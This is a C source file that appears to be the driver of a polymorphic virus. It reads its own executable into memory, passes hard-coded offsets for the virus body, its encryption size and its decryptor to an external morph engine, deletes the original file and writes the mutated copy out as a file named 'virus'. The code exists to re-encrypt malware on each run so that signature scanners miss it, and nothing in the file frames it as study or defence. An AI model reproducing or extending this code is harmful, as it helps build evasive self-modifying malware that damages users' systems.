#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>
#include <string.h>
#include <unistd.h>

char *filename;

extern int morph_engine(char* exe_data, size_t virus_instruction_begin, size_t virus_encrypt_size, size_t virus_decrypt_offset);
// extern int decrypt_engine(char* exe_data,size_t full_addr_enc_begin ,size_t virus_instruction_begin, size_t virus_encrypt_size, size_t virus_decrypt_offset);
int getfilename(int argc, char *argv[]){

	// get the file name from argument
	filename = argv[0];

	return 0;
}

int polymorphic(unsigned long virus_instruction_begin, unsigned long virus_encrypt_size, unsigned long virus_decrypt_offset)
{


	// seed the random number generator
	srand(time(NULL));


	/* Append these values from manual input via objdump*/
	virus_instruction_begin = 4656;
	virus_encrypt_size = 2608;
	virus_decrypt_offset = 7502;


	FILE *f = fopen(filename, "rb");
	fseek(f, 0, SEEK_END);
	long fsize = ftell(f);
	fseek(f, 0, SEEK_SET);  /* same as rewind(f); */

	char *string = malloc(fsize + 1);
	if(!string)
	{
			fclose(filename);
			printf("Executable data allocation failed\n");
			return 1;
	}
	fread(string, 1, fsize, f);
	fclose(f);



	// call the polymorphic engine
	if(morph_engine(string, virus_instruction_begin, virus_encrypt_size, virus_decrypt_offset) != 0)
	{
		printf("An error occured in the polymorphic engine\n");

	}

	remove(filename);


	FILE* out_file = fopen("virus", "wb");
	// write the modified executable data
	fwrite(string, fsize, 1, out_file);
	fclose(out_file);


	free(string);
	return 0;

}